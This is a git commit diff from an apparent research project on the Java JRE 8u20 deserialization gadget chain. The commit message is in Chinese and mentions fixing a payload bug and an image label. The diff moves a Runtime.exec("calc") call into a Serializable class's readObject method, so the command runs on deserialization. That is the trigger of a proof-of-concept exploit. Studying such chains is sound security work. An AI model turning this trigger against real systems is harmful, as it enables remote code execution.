865b36643bc751a028874a7f92a3c618e1c2067f
feihong <huangfeihong-cs@163.com>
2021-05-23 13:54:04 +0800

    1. 修复 Paylaod 构造错误导致的 TestCase2 运行未达到预期效果的bug 2. 修改第一张图片中 size 标错的问题

--- src/main/java/com/feihong/jre8u20/Payload.java
+++ src/main/java/com/feihong/jre8u20/Payload.java
@@ -1,10 +1,15 @@
 package com.feihong.jre8u20;
 
 import java.io.IOException;
+import java.io.ObjectInputStream;
 import java.io.Serializable;
 
 public class Payload implements Serializable {
     public Payload() throws IOException {
+
+    }
+
+    private synchronized void readObject(ObjectInputStream ois) throws IOException {
         Runtime.getRuntime().exec("calc");
     }
 }
